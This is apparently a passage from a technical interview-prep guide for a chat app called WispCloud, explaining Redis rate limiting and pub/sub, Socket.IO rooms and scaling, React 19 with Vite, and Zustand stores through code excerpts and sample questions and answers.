#### Use Case 4: Rate Limiting

```javascript
// Redis-backed rate limiter
import rateLimit from 'express-rate-limit';
import { RedisStore } from 'rate-limit-redis';

export const createRateLimiter = (options) => {
  const { windowMs, max, message } = options;

  if (!isRedisConnected()) {
    // Fallback to memory store
    return rateLimit({ windowMs, max, message });
  }

  const redisClient = getRedisClient();

  return rateLimit({
    windowMs,           // Time window (e.g., 15 minutes)
    max,                // Max requests per window
    message: { error: message },
    store: new RedisStore({
      sendCommand: (...args) => redisClient.sendCommand(args),
    }),
    keyGenerator: (req) => {
      // Use IP + user ID for authenticated requests
      if (req.user && req.user._id) {
        return `${req.ip}-${req.user._id}`;
      }
      return req.ip;
    },
  });
};

// Message rate limiter: 50 messages per minute
export const messageLimiter = createRateLimiter({
  windowMs: 60 * 1000,
  max: 50,
  message: 'Too many messages, please slow down',
});
```

**How it works:**
```
Redis key: "rl:192.168.1.1-user123:messages"
Value: Request count
TTL: 60 seconds

Request 1 → count = 1
Request 2 → count = 2
...
Request 51 → count = 51 → BLOCKED (429 Too Many Requests)

After 60s → key expires → count resets to 0
```

**Why Redis for rate limiting?**
- **Distributed:** Works across multiple backend instances
- **Atomic increment:** No race conditions
- **Auto-expire:** TTL removes old data automatically

#### Use Case 5: Socket.IO Pub/Sub Adapter

```javascript
// C:\Users\Nilansh\Desktop\WispCloud\backend\src\lib\socket.js

import { Server } from "socket.io";
import { createAdapter } from "@socket.io/redis-adapter";
import { createClient } from "redis";

export const initializeSocketIO = async () => {
  try {
    const redisUrl = process.env.REDIS_URL;

    // Create separate pub/sub clients
    const pubClient = createClient({ url: redisUrl });
    const subClient = pubClient.duplicate();

    await Promise.all([pubClient.connect(), subClient.connect()]);

    // Use Redis adapter for multi-instance scaling
    io.adapter(createAdapter(pubClient, subClient));

    console.log('✅ Socket.IO Redis Adapter enabled');
  } catch (error) {
    console.warn('⚠️  Redis Adapter failed. Single-instance mode.');
  }
};
```

**How it enables horizontal scaling:**
```
Without Redis Adapter:
Backend 1: User A connects
Backend 2: User B connects
Backend 1 emits "newMessage" → Only User A receives (User B on different instance!)

With Redis Adapter:
Backend 1: User A connects
Backend 2: User B connects
Backend 1 emits "newMessage" → Publishes to Redis → Redis broadcasts to all backends
    → Backend 1 delivers to User A
    → Backend 2 delivers to User B ✅
```

**Pub/Sub flow:**
```
Backend 1                    Redis                    Backend 2
    │                          │                          │
    │──newMessage──>│<─────subscribe────│
    │                  │───publish────>│
    │                  │                  │───deliver──>User B
    └─deliver──>User A
```

### Key Concepts

#### 1. TTL (Time To Live)

**What:** Auto-expire keys after a duration.

```javascript
// Set key with 60-second expiration
await redis.setEx('session:123', 60, 'data');

// Set expiration on existing key
await redis.set('key', 'value');
await redis.expire('key', 60);

// Check remaining TTL
const ttl = await redis.ttl('key'); // Returns seconds remaining
```

**WispCloud usage:**
- User cache: 300s (5 minutes)
- Rate limit counters: 60-900s (1-15 minutes)
- Session data: 604800s (7 days)

#### 2. Atomic Operations

**What:** Operations that complete entirely or not at all (no partial state).

```javascript
// Atomic increment (for counters)
await redis.incr('counter'); // Atomically increments by 1

// Set if not exists (for locks)
const acquired = await redis.setNX('lock:resource', 'locked');
if (acquired) {
  // Do work
  await redis.del('lock:resource'); // Release lock
}

// Get and set atomically
const oldValue = await redis.getSet('key', 'newValue');
```

#### 3. Persistence Options

**RDB (Redis Database Snapshot):**
- Periodic snapshots of entire dataset
- Fast restarts, compact files
- May lose data between snapshots

**AOF (Append-Only File):**
- Logs every write operation
- More durable (can be configured for every operation)
- Slower, larger files

**WispCloud:** Uses RDB (default) - Acceptable to lose recent cache data

#### 4. Memory Eviction Policies

**What:** What Redis does when memory is full.

```
noeviction      - Return errors, don't evict
allkeys-lru     - Evict least recently used keys
volatile-lru    - Evict LRU keys with TTL set
allkeys-random  - Evict random keys
volatile-random - Evict random keys with TTL
volatile-ttl    - Evict keys closest to expiration
```

**WispCloud:** Uses `allkeys-lru` (Redis Cloud default)
- Evicts least used keys first
- Good for cache use case

### Common Interview Questions

**Q1: Why use Redis instead of caching in Node.js memory?**

**A:** In-memory caching doesn't work with multiple backend instances. If Backend 1 caches data, Backend 2 won't see it. Redis provides a shared cache that all instances can access. Also, Redis persists data across restarts, while in-memory cache is lost.

**Q2: How does Redis achieve such high performance?**

**A:**
1. **In-memory:** All data in RAM (microsecond access vs millisecond disk)
2. **Single-threaded:** No lock contention, no context switching
3. **Simple data structures:** Optimized for specific use cases
4. **No query parsing:** Commands are simple (GET, SET vs SQL parsing)
5. **Pipelining:** Batch multiple commands in one network round trip

**Q3: What's the difference between Redis Sets and Lists?**

**A:**
- **Set:** Unordered, unique elements, O(1) add/remove/check
  - Use case: Online users, tags
- **List:** Ordered, allows duplicates, O(1) push/pop at ends
  - Use case: Message queues, activity feeds

**Q4: How do you handle Redis failures?**

**A:** Graceful degradation:
```javascript
try {
  const cached = await redis.get(key);
  if (cached) return cached;
} catch (error) {
  console.error('Redis error:', error);
  // Fall through to database
}

// Always fetch from database as fallback
return await db.query();
```

For critical data (like sessions), consider Redis Sentinel (auto-failover) or Redis Cluster (sharding + replication).

**Q5: What's cache invalidation and why is it hard?**

**A:** Cache invalidation is removing stale data from cache. It's one of the "two hard problems in computer science."

Strategies:
1. **TTL:** Expire after time (simple but may serve stale data)
2. **Write-through:** Update cache on every write (complex)
3. **Event-driven:** Invalidate on specific events (flexible)

WispCloud uses TTL for simplicity. 5 minutes of stale user data is acceptable.

> **Interview Tip:** Explain that Redis is not just a cache - it's a data structure server used for presence, rate limiting, pub/sub, and more.

---

## 3.4 Socket.IO & WebSockets

### What are WebSockets?

**WebSockets** is a protocol that provides full-duplex communication channels over a single TCP connection. Unlike HTTP (request-response), WebSockets keep the connection open for bidirectional communication.

**HTTP vs WebSocket:**
```
HTTP Request-Response Pattern:
Client                              Server
  │                                   │
  │────── GET /messages ────────────>│
  │<───── 200 OK (messages) ─────────│
  │                                   │
  │ (Connection closes)               │
  │                                   │
  │────── GET /messages ────────────>│ (New connection!)
  │<───── 200 OK (messages) ─────────│

WebSocket Pattern:
Client                              Server
  │                                   │
  │────── Handshake (HTTP) ─────────>│
  │<───── 101 Switching Protocols ───│
  │                                   │
  │═════════════════════════════════>│ (Connection stays open)
  │<═════════════════════════════════│
  │                                   │
  │<───── Message (server push!) ────│ (Server can initiate!)
  │────── Message ──────────────────>│
  │                                   │
```

**Key Advantages:**
- **Low latency:** No repeated HTTP handshakes
- **Bidirectional:** Server can push data to client
- **Efficient:** Single connection, minimal overhead
- **Real-time:** Perfect for chat, gaming, live updates

### What is Socket.IO?

**Socket.IO** is a JavaScript library that wraps WebSockets with additional features like automatic reconnection, fallback mechanisms, and event-based communication.

**Socket.IO vs Raw WebSockets:**

| Feature | WebSocket | Socket.IO |
|---------|-----------|-----------|
| Browser support | Modern browsers only | Fallback to polling |
| Reconnection | Manual | Automatic |
| Rooms/Namespaces | No | Yes |
| Event-based | No (just messages) | Yes (custom events) |
| Binary support | Yes | Yes |
| Scaling | Manual | Redis adapter |

**Why Socket.IO over Raw WebSockets:**
- **Automatic reconnection:** Client reconnects automatically if disconnected
- **Fallback mechanism:** Falls back to HTTP long-polling if WebSocket unavailable
- **Room support:** Group users into rooms (perfect for group chats)
- **Event-based API:** Cleaner than handling raw message strings
- **Redis adapter:** Built-in multi-instance scaling via Pub/Sub

> **Key Concept:** Socket.IO is NOT WebSocket. It's a library that uses WebSocket when available, but can fall back to other transports.

### Why We Chose Socket.IO

**Alternatives Considered:**
1. **Native WebSocket API**
   - Pros: Lightweight, no dependencies
   - Cons: Manual reconnection, no rooms, no fallback

2. **ws (WebSocket library)**
   - Pros: Faster than Socket.IO, simpler
   - Cons: No automatic reconnection, no rooms, no multi-instance scaling

3. **Pusher (SaaS)**
   - Pros: Fully managed, no infrastructure
   - Cons: Expensive at scale, vendor lock-in

4. **MQTT**
   - Pros: Very lightweight, pub/sub
   - Cons: Not designed for web, complex setup

**Why Socket.IO Won:**
- **Reliability:** Automatic reconnection keeps users connected
- **Rooms:** Built-in support for group chats
- **Redis adapter:** Easy horizontal scaling
- **Event-based:** Clean API for different message types
- **Mature:** Battle-tested in production at scale

### How We Use Socket.IO in WispCloud

**Server Setup (Real Code):**
```javascript
// C:\Users\Nilansh\Desktop\WispCloud\backend\src\lib\socket.js

import { Server } from "socket.io";
import { createAdapter } from "@socket.io/redis-adapter";
import http from "http";
import express from "express";
import { createClient } from "redis";

const app = express();
const server = http.createServer(app);

// Create Socket.IO server
const io = new Server(server, {
  cors: {
    origin: process.env.FRONTEND_URL || "http://localhost:5173",
    credentials: true
  },
  pingTimeout: 60000,    // Consider client dead after 60s no pong
  pingInterval: 25000    // Send ping every 25s to keep alive
});

// Initialize Redis Adapter for horizontal scaling
export const initializeSocketIO = async () => {
  try {
    const redisUrl = process.env.REDIS_URL || 'redis://localhost:6379';

    // Create separate pub/sub clients
    const pubClient = createClient({ url: redisUrl });
    const subClient = pubClient.duplicate();

    await Promise.all([pubClient.connect(), subClient.connect()]);

    // Attach Redis adapter to Socket.IO
    io.adapter(createAdapter(pubClient, subClient));

    console.log('✅ Socket.IO Redis Adapter initialized');
  } catch (error) {
    console.warn('⚠️  Redis Adapter failed. Running single-instance mode.');
  }
};

export { io, app, server };
```

**Connection Handler:**
```javascript
io.on("connection", async (socket) => {
  console.log("✅ User connected:", socket.id);

  // Get user ID from connection query
  const userId = socket.handshake.query.userId;

  if (userId && userId !== 'undefined') {
    try {
      // 1. Store socket mapping in Redis
      await mapSocketToUser(socket.id, userId);

      // 2. Set user as online
      await setUserOnline(userId);

      // 3. Join user's group rooms
      const userGroups = await GroupMember.find({
        userId,
        status: 'active',
      }).select('groupId');

      for (const membership of userGroups) {
        socket.join(membership.groupId.toString());
        console.log(`👥 User ${userId} joined group: ${membership.groupId}`);
      }

      // 4. Broadcast updated online users list
      const onlineUsers = await getOnlineUsers();
      io.emit("getOnlineUsers", onlineUsers);

      console.log(`📡 User ${userId} is online`);
    } catch (error) {
      console.error('Connection error:', error);
    }
  }

  // Handle disconnect
  socket.on("disconnect", async () => {
    console.log("❌ User disconnected:", socket.id);

    if (userId && userId !== 'undefined') {
      try {
        // 1. Remove socket mapping
        await removeSocketMapping(socket.id);

        // 2. Set user offline
        await setUserOffline(userId);

        // 3. Broadcast updated online users
        const onlineUsers = await getOnlineUsers();
        io.emit("getOnlineUsers", onlineUsers);

        console.log(`📴 User ${userId} is offline`);
      } catch (error) {
        console.error('Disconnect error:', error);
      }
    }
  });

  // Handle typing indicator (DM)
  socket.on("typing", async (data) => {
    const receiverSocketId = await getReceiverSocketId(data.receiverId);
    if (receiverSocketId) {
      io.to(receiverSocketId).emit("userTyping", {
        senderId: userId,
        isTyping: data.isTyping
      });
    }
  });

  // Handle group typing indicator
  socket.on("groupTyping", async (data) => {
    const { groupId, isTyping } = data;
    // Broadcast to all group members except sender
    socket.to(groupId).emit("userTypingInGroup", {
      groupId,
      senderId: userId,
      isTyping
    });
  });

  // Handle joining a new group
  socket.on("joinGroup", async (data) => {
    const { groupId } = data;

    // Verify membership
    const membership = await GroupMember.findOne({
      groupId,
      userId,
      status: 'active',
    });

    if (membership) {
      socket.join(groupId);
      console.log(`👥 User ${userId} joined group: ${groupId}`);
      socket.emit("groupJoined", { groupId });
    }
  });

  // Handle leaving a group
  socket.on("leaveGroup", (data) => {
    const { groupId } = data;
    socket.leave(groupId);
    console.log(`👋 User ${userId} left group: ${groupId}`);
  });
});
```

**Client Setup (React):**
```javascript
// C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\store\useAuthStore.js

import { io } from "socket.io-client";

const BASE_URL = import.meta.env.VITE_API_URL || "http://localhost:5001";

export const useAuthStore = create((set, get) => ({
  socket: null,
  onlineUsers: [],

  connectSocket: () => {
    const { authUser, socket: existingSocket } = get();
    if (!authUser) return;

    // Prevent duplicate connections
    if (existingSocket?.connected) {
      console.log('Socket already connected');
      return;
    }

    // Disconnect existing socket if present
    if (existingSocket) {
      existingSocket.disconnect();
    }

    // Create new socket connection
    const socket = io(BASE_URL, {
      query: {
        userId: authUser._id,  // Send user ID in connection
      },
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 1000,
    });

    set({ socket: socket });

    // Listen for online users updates
    socket.on("getOnlineUsers", (userIds) => {
      set({ onlineUsers: userIds });
    });

    socket.on("connect", () => {
      console.log('Socket connected:', socket.id);
    });

    socket.on("connect_error", (error) => {
      console.error('Socket connection error:', error);
    });
  },

  disconnectSocket: () => {
    if (get().socket?.connected) get().socket.disconnect();
  },
}));
```

**Emitting Messages from Backend:**
```javascript
// In message controller
export const sendMessage = async (req, res) => {
  try {
    const { text, image } = req.body;
    const { userId: receiverId } = req.params;
    const senderId = req.user._id;

    // 1. Save message to database
    const newMessage = await Message.create({
      senderId,
      receiverId,
      text,
      image,
    });

    // 2. Get receiver's socket ID from Redis
    const receiverSocketId = await getReceiverSocketId(receiverId);

    // 3. Emit to receiver if online
    if (receiverSocketId) {
      io.to(receiverSocketId).emit("newMessage", newMessage);
    }

    // 4. Also send to sender for confirmation
    res.status(201).json(newMessage);
  } catch (error) {
    console.error('Error sending message:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};
```

**Receiving Messages on Frontend:**
```javascript
// C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\store\useChatStore.js

export const useChatStore = create((set, get) => ({
  messages: [],

  subscribeToMessages: () => {
    const { selectedUser } = get();
    if (!selectedUser) return;

    const socket = useAuthStore.getState().socket;

    // Listen for new messages
    socket.on("newMessage", (newMessage) => {
      const isFromSelectedUser = newMessage.senderId === selectedUser._id;
      if (!isFromSelectedUser) return;

      // Add to messages array
      set({
        messages: [...get().messages, newMessage],
      });
    });

    // Listen for read receipts
    socket.on("messagesRead", (data) => {
      const { messageIds, readAt } = data;
      set((state) => ({
        messages: state.messages.map((msg) =>
          messageIds.includes(msg._id)
            ? { ...msg, status: "read", readAt }
            : msg
        ),
      }));
    });
  },

  unsubscribeFromMessages: () => {
    const socket = useAuthStore.getState().socket;
    socket.off("newMessage");
    socket.off("messagesRead");
  },
}));
```

### Key Concepts

#### 1. Rooms

**What:** Rooms allow you to group sockets and broadcast to them.

**WispCloud Usage:**
```javascript
// User joins group room when connecting
socket.join(groupId);

// Send message to all users in group
io.to(groupId).emit("newGroupMessage", message);

// Send to everyone in room EXCEPT sender
socket.to(groupId).emit("userTyping", { userId, isTyping: true });

// Leave room
socket.leave(groupId);
```

**Behind the scenes:**
```
Room "group123":
  - socket_abc (User A)
  - socket_def (User B)
  - socket_ghi (User C)

io.to("group123").emit("msg") → Broadcasts to all 3 sockets
socket.to("group123").emit("msg") → Broadcasts to 2 (except sender)
```

#### 2. Events

**What:** Custom event names for different message types.

```javascript
// Server emits events
socket.emit("eventName", data);           // To sender only
io.emit("eventName", data);               // To all connected clients
io.to(socketId).emit("eventName", data);  // To specific socket
io.to(room).emit("eventName", data);      // To room

// Client listens for events
socket.on("eventName", (data) => {
  // Handle data
});
```

**WispCloud Events:**
```javascript
// Connection events
"connect", "disconnect"

// Message events
"newMessage", "newGroupMessage", "messagesRead"

// Presence events
"getOnlineUsers", "userOnline", "userOffline"

// Typing events
"typing", "userTyping", "groupTyping", "userTypingInGroup"

// Group events
"joinGroup", "leaveGroup", "groupJoined", "memberAdded"
```

#### 3. Acknowledgments (ACKs)

**What:** Callbacks to confirm message receipt.

```javascript
// Client sends message with callback
socket.emit("sendMessage", { text: "Hello" }, (response) => {
  console.log("Server acknowledged:", response);
});

// Server sends acknowledgment
socket.on("sendMessage", (data, callback) => {
  // Process message
  callback({ status: "success", messageId: "123" });
});
```

**WispCloud use case:**
```javascript
// Ensure message was saved before showing in UI
socket.emit("sendMessage", messageData, (ack) => {
  if (ack.status === "success") {
    // Show success indicator
  } else {
    // Show error, allow retry
  }
});
```

#### 4. Reconnection Logic

**What:** Automatic reconnection when connection lost.

```javascript
const socket = io(BASE_URL, {
  reconnection: true,
  reconnectionAttempts: 5,    // Try 5 times
  reconnectionDelay: 1000,    // Wait 1s between attempts
  reconnectionDelayMax: 5000, // Max 5s between attempts
});

// Handle reconnection events
socket.on("reconnect", (attemptNumber) => {
  console.log(`Reconnected after ${attemptNumber} attempts`);
  // Re-subscribe to rooms, fetch missed messages
});

socket.on("reconnect_attempt", (attemptNumber) => {
  console.log(`Reconnection attempt ${attemptNumber}`);
});

socket.on("reconnect_failed", () => {
  console.log("Reconnection failed. Please refresh.");
  // Show user a "Connection lost" message
});
```

#### 5. Multi-Instance Scaling with Redis Adapter

**Problem:** Without Redis adapter:
```
Load Balancer
    ├─ Backend 1 (User A connected)
    └─ Backend 2 (User B connected)

User A sends message → Backend 1 → Only User A receives ❌
User B never gets the message (connected to different backend)
```

**Solution:** Redis Pub/Sub adapter:
```
Load Balancer
    ├─ Backend 1 (User A)  ──┐
    └─ Backend 2 (User B)  ──┼── Redis Pub/Sub
                              │
User A sends message
    → Backend 1 saves to DB
    → Backend 1 publishes "newMessage" to Redis
    → Redis broadcasts to all backends (1 and 2)
    → Backend 1 emits to User A ✅
    → Backend 2 emits to User B ✅
```

**Code:**
```javascript
import { createAdapter } from "@socket.io/redis-adapter";

const pubClient = createClient({ url: REDIS_URL });
const subClient = pubClient.duplicate();

await Promise.all([pubClient.connect(), subClient.connect()]);

io.adapter(createAdapter(pubClient, subClient));

// Now Socket.IO automatically syncs across all backend instances!
```

### Common Interview Questions

**Q1: What's the difference between WebSocket and Socket.IO?**

**A:**
- **WebSocket** is a protocol (like HTTP)
- **Socket.IO** is a library that uses WebSocket (and other transports)

Socket.IO adds:
- Automatic reconnection
- Fallback to HTTP long-polling
- Event-based API
- Room/namespace support
- Redis adapter for scaling

**Q2: How do you handle users disconnecting and reconnecting?**

**A:** Three strategies:

1. **Optimistic UI:** Show message immediately, mark as "sending"
2. **On reconnect:** Fetch missed messages from server
3. **Sequence numbers:** Track last received message ID

```javascript
socket.on("reconnect", async () => {
  const lastMessageId = getLastMessageId();
  const missedMessages = await fetch(`/messages/since/${lastMessageId}`);
  addMessages(missedMessages);
});
```

**Q3: How do you scale Socket.IO horizontally?**

**A:** Use Redis adapter for Pub/Sub:

```javascript
io.adapter(createAdapter(pubClient, subClient));
```

This syncs all events across backend instances. When Backend 1 emits, Redis broadcasts to all backends, which emit to their connected clients.

**Q4: What's the difference between socket.emit() and io.emit()?**

**A:**
- `socket.emit()` → Send to ONE socket (the sender)
- `io.emit()` → Send to ALL connected sockets (broadcast)
- `socket.to(room).emit()` → Send to room EXCEPT sender
- `io.to(room).emit()` → Send to entire room

```javascript
socket.emit("msg", data);        // To sender only
io.emit("msg", data);            // To everyone
socket.to(groupId).emit("msg");  // To group except sender
io.to(groupId).emit("msg");      // To entire group
```

**Q5: How do you secure Socket.IO connections?**

**A:** Multiple layers:

1. **Authentication middleware:**
```javascript
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (verifyToken(token)) {
    next();
  } else {
    next(new Error("Authentication error"));
  }
});
```

2. **CORS configuration:**
```javascript
const io = new Server(server, {
  cors: {
    origin: process.env.FRONTEND_URL,
    credentials: true
  }
});
```

3. **Room authorization:**
```javascript
socket.on("joinGroup", async (groupId) => {
  const isMember = await checkGroupMembership(userId, groupId);
  if (isMember) {
    socket.join(groupId);
  } else {
    socket.emit("error", "Not authorized");
  }
});
```

> **Interview Tip:** Be ready to draw the diagram showing how Redis adapter enables multi-instance Socket.IO scaling.

---

## 3.5 React 19 & Vite - Modern Frontend Build System

### What is React 19?

React 19 is the latest major version of React with significant performance improvements and new features. WispCloud uses React 19 for its cutting-edge capabilities.

**Key Features Used in WispCloud:**

1. **Automatic batching** - Multiple state updates are batched automatically
2. **Concurrent rendering** - Non-blocking UI updates
3. **Improved hooks** - Better performance and developer experience
4. **Streaming SSR support** - Though WispCloud uses SPA architecture

### React Hooks in WispCloud

WispCloud extensively uses React hooks for state management and side effects:

```jsx
// Example from ChatContainer.jsx
import { useEffect, useRef } from "react";
import { useChatStore } from "../store/useChatStore";
import { useAuthStore } from "../store/useAuthStore";

const ChatContainer = () => {
  const messageEndRef = useRef(null);
  const {
    messages,
    getMessages,
    isMessagesLoading,
    selectedUser,
    subscribeToMessages,
    unsubscribeFromMessages
  } = useChatStore();

  const { authUser } = useAuthStore();

  // Fetch messages when user is selected
  useEffect(() => {
    if (selectedUser?._id) {
      getMessages(selectedUser._id);
    }
  }, [selectedUser?._id, getMessages]);

  // Subscribe to real-time messages
  useEffect(() => {
    subscribeToMessages();
    return () => unsubscribeFromMessages();
  }, [subscribeToMessages, unsubscribeFromMessages]);

  // Auto-scroll to bottom
  useEffect(() => {
    messageEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages]);

  return (
    <div className="chat-container">
      {/* Chat UI */}
    </div>
  );
};
```

**Common Hooks Used:**

| Hook | Purpose | Usage Example |
|------|---------|---------------|
| `useState` | Local component state | `const [isOpen, setIsOpen] = useState(false)` |
| `useEffect` | Side effects & lifecycle | Fetching data, subscriptions, cleanup |
| `useRef` | DOM references & mutable values | Scroll containers, input focus |
| `useMemo` | Memoize expensive calculations | Filtering/sorting large lists |
| `useCallback` | Memoize callback functions | Prevent unnecessary re-renders |

### JSX - JavaScript XML

JSX allows writing HTML-like code in JavaScript. WispCloud uses JSX extensively:

```jsx
// Example from CreateGroupModal.jsx
const CreateGroupModal = ({ isOpen, onClose }) => {
  const [groupName, setGroupName] = useState("");
  const [selectedUsers, setSelectedUsers] = useState([]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    // Create group logic
  };

  return (
    <div className={`modal ${isOpen ? 'modal-open' : ''}`}>
      <div className="modal-box">
        <h3 className="font-bold text-lg">Create New Group</h3>

        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Group Name"
            value={groupName}
            onChange={(e) => setGroupName(e.target.value)}
            className="input input-bordered w-full"
          />

          {/* User selection component */}
          <UserSelector
            onSelect={(users) => setSelectedUsers(users)}
          />

          <button type="submit" className="btn btn-primary">
            Create Group
          </button>
        </form>
      </div>
    </div>
  );
};
```

**JSX Rules:**

1. Must return single parent element (or Fragment)
2. Use `className` instead of `class`
3. Use `htmlFor` instead of `for`
4. Self-closing tags required: `<img />`, `<input />`
5. Curly braces `{}` for JavaScript expressions

### What is Vite?

Vite is a modern build tool that provides:
- **Lightning-fast dev server** - Cold start in milliseconds
- **Hot Module Replacement (HMR)** - Instant updates without refresh
- **Optimized production builds** - Using Rollup under the hood

**WispCloud's Vite Configuration:**

```javascript
// vite.config.js
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import tailwindcss from '@tailwindcss/vite'

export default defineConfig({
  plugins: [
    react(),        // React support with Fast Refresh
    tailwindcss(),  // Tailwind CSS v4 integration
  ],
})
```

### How Vite Dev Server Works

```
┌─────────────────────────────────────────────────────┐
│  Vite Dev Server (http://localhost:5173)            │
├─────────────────────────────────────────────────────┤
│                                                      │
│  1. Browser requests: /src/App.jsx                  │
│     ↓                                                │
│  2. Vite intercepts request                         │
│     ↓                                                │
│  3. Transform JSX → JS (on-demand, not bundled)     │
│     ↓                                                │
│  4. Send transformed ES modules to browser          │
│     ↓                                                │
│  5. Browser executes native ES modules              │
│                                                      │
│  ⚡ Result: Instant dev server start!               │
└─────────────────────────────────────────────────────┘
```

**Traditional bundlers (Webpack):**
- Bundle entire app → Slow start (30s - 2min)
- Edit file → Re-bundle → Slow refresh

**Vite:**
- Serve files as native ES modules → Fast start (<1s)
- Edit file → HMR only that module → Instant refresh

### Hot Module Replacement (HMR)

HMR updates modules in the browser without full page reload:

```
Developer saves file (e.g., ChatContainer.jsx)
          ↓
Vite detects file change
          ↓
Vite transforms only the changed module
          ↓
Vite sends update via WebSocket
          ↓
Browser receives update
          ↓
React Fast Refresh applies changes
          ↓
Component re-renders (state preserved!)
```

**Example - Editing a component:**

```jsx
// Before (in browser)
const Navbar = () => {
  const [count, setCount] = useState(0);
  return <div>Count: {count}</div>; // Button text says "Click"
};

// You edit the file:
const Navbar = () => {
  const [count, setCount] = useState(0);
  return <div>Count: {count}</div>; // Changed to "Press"
};

// After HMR:
// - Component updates instantly
// - count state is PRESERVED (still same value)
// - No page refresh needed
```

### Vite Build Process

**Development:**
```bash
npm run dev
```
- Starts dev server on port 5173
- Serves source files as ES modules
- HMR enabled
- No bundling (instant start)

**Production:**
```bash
npm run build
```

```
Step 1: Pre-bundling dependencies
  → node_modules → Optimized vendor chunks

Step 2: Tree-shaking
  → Remove unused code from build

Step 3: Minification
  → Compress JavaScript and CSS

Step 4: Code splitting
  → Split into multiple chunks for lazy loading

Step 5: Asset optimization
  → Hash filenames (cache busting)
  → Optimize images

Output: dist/ folder
  ├── index.html
  ├── assets/
  │   ├── index-abc123.js     (main bundle)
  │   ├── vendor-def456.js    (dependencies)
  │   └── index-ghi789.css    (styles)
```

**Build Output Example:**

```
dist/
├── index.html                    # Entry HTML
├── assets/
│   ├── index-a1b2c3d4.js       # Main app code (hashed)
│   ├── vendor-e5f6g7h8.js      # React, Zustand, etc.
│   ├── ChatContainer-i9j0k1.js # Code-split component
│   └── index-l2m3n4o5.css      # Compiled Tailwind
```

### Why React 19 + Vite for WispCloud?

| Feature | Benefit for WispCloud |
|---------|----------------------|
| **Fast dev server** | Developers can iterate quickly on features |
| **HMR** | Test real-time chat without losing state |
| **Concurrent rendering** | Smooth UI even during heavy message loads |
| **Tree-shaking** | Smaller bundle = faster initial load |
| **ES modules** | Modern, standards-compliant code |

### Common Interview Questions

**Q1: What's the difference between Vite and Webpack?**

**A:**
- **Webpack**: Bundles everything upfront (slow dev start, fast production)
- **Vite**: Serves ES modules in dev (instant start), bundles for production

**Q2: How does HMR preserve React state?**

**A:** React Fast Refresh (integrated with Vite) re-renders components while preserving their state. It only re-executes the component function, not the entire module.

**Q3: Why use concurrent rendering?**

**A:** Allows React to interrupt expensive renders to handle high-priority updates (like user input), preventing UI freezing.

---

## 3.6 Zustand State Management - Simple, Scalable State

### Why Not Redux?

WispCloud chose Zustand over Redux for several reasons:

| Redux | Zustand |
|-------|---------|
| Boilerplate-heavy | Minimal boilerplate |
| Actions, reducers, dispatchers | Direct state updates |
| ~600 lines for a simple store | ~50 lines for same store |
| Provider wrapper required | No provider needed |
| DevTools setup complex | DevTools out-of-the-box |

**Redux Example (authentication):**
```javascript
// Actions
const LOGIN_REQUEST = 'LOGIN_REQUEST';
const LOGIN_SUCCESS = 'LOGIN_SUCCESS';
const LOGIN_FAILURE = 'LOGIN_FAILURE';

// Action creators
const loginRequest = () => ({ type: LOGIN_REQUEST });
const loginSuccess = (user) => ({ type: LOGIN_SUCCESS, payload: user });
const loginFailure = (error) => ({ type: LOGIN_FAILURE, payload: error });

// Reducer
const authReducer = (state = initialState, action) => {
  switch (action.type) {
    case LOGIN_REQUEST:
      return { ...state, isLoading: true };
    case LOGIN_SUCCESS:
      return { ...state, isLoading: false, user: action.payload };
    case LOGIN_FAILURE:
      return { ...state, isLoading: false, error: action.payload };
    default:
      return state;
  }
};

// Store configuration
const store = createStore(authReducer, applyMiddleware(thunk));
```

**Same thing in Zustand:**
```javascript
const useAuthStore = create((set) => ({
  user: null,
  isLoading: false,

  login: async (data) => {
    set({ isLoading: true });
    try {
      const user = await api.login(data);
      set({ user, isLoading: false });
    } catch (error) {
      set({ isLoading: false });
    }
  }
}));
```

### How Zustand Works

Zustand is built on three principles:

1. **Vanilla JavaScript store** - Works outside React too
2. **Hooks-based API** - Integrates seamlessly with React
3. **No providers** - Direct import and use

**Architecture:**

```
┌─────────────────────────────────────────┐
│  create((set, get) => ({ ... }))        │
│                                          │
│  Returns: useStore hook                 │
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  Component calls: useStore()             │
│                                          │
│  → Subscribes to store changes          │
│  → Re-renders only when used data changes│
└─────────────────────────────────────────┘
              ↓
┌─────────────────────────────────────────┐
│  State update: set({ user: newUser })   │
│                                          │
│  → Notifies all subscribers             │
│  → React re-renders subscribed components│
└─────────────────────────────────────────┘
```

### WispCloud Store Examples

#### 1. useAuthStore.js - Authentication State

```javascript
// C:\Users\Nilansh\Desktop\WispCloud\frontend\Wisp\src\store\useAuthStore.js
import { create } from "zustand";
import { axiosInstance } from '../lib/axios.js';
import toast from "react-hot-toast";
import { io } from "socket.io-client";

const BASE_URL = import.meta.env.VITE_API_URL || "http://localhost:5001"

export const useAuthStore = create((set, get) => ({
  // ========== STATE ==========
  authUser: null,
  isSigningUp: false,
  isLoggingIn: false,
  isUpdatingProfile: false,
  isCheckingAuth: true,
  onlineUsers: [],
  socket: null,

  // ========== ACTIONS ==========

  // Check if user is authenticated (on app load)
  checkAuth: async () => {
    try {
      const res = await axiosInstance.get("/auth/check");
      set({ authUser: res.data });
      get().connectSocket(); // Connect WebSocket after auth
    } catch (error) {
      set({ authUser: null });
      console.log("Error in checkAuth:", error);
    } finally {
      set({ isCheckingAuth: false })
    }
  },

  // Sign up new user
  signup: async (data) => {
    set({ isSigningUp: true });
    try {
      const res = await axiosInstance.post("/auth/signup", data);
      set({ authUser: res.data })
      toast.success("Account created successfully")
      get().connectSocket();
    } catch (error) {
      toast.error(error.response.data.message)
    } finally {
      set({ isSigningUp: false });
    }
  },

  // Login existing user
  login: async (data) => {
    set({ isLoggingIn: true });
    try {
      const res = await axiosInstance.post("/auth/login", data);
      set({ authUser: res.data });
      toast.success("Logged in successfully");
      get().connectSocket();
    } catch (error) {
      toast.error(error.response.data.message);
    } finally {
      set({ isLoggingIn: false });
    }
  },

  // Logout user
  logout: async () => {
    try {
      await axiosInstance.post("/auth/logout");
      set({ authUser: null })
      toast.success("Logged out successfully");
      get().disconnectSocket();
    } catch (error) {
      toast.error(error.response.data.message);
